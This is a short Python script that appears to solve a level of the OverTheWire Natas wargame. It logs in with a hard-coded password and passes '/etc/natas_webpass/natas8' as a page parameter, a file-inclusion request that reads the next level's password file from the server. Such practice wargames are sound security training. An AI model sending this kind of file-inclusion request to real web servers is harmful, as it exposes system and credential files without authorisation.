#!/usr/bin/env python3

import requests
import re

req = requests.Session()

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
url = "http://%s.natas.labs.overthewire.org" % username


param = {"page" : "/etc/natas_webpass/natas8"}
req_get = req.get(url,auth=(username,password),params=param)

# print(req_get.text)


nxt_pass = re.findall("<br>\n<br>\n(.*)\n",req_get.text)
print(nxt_pass[0])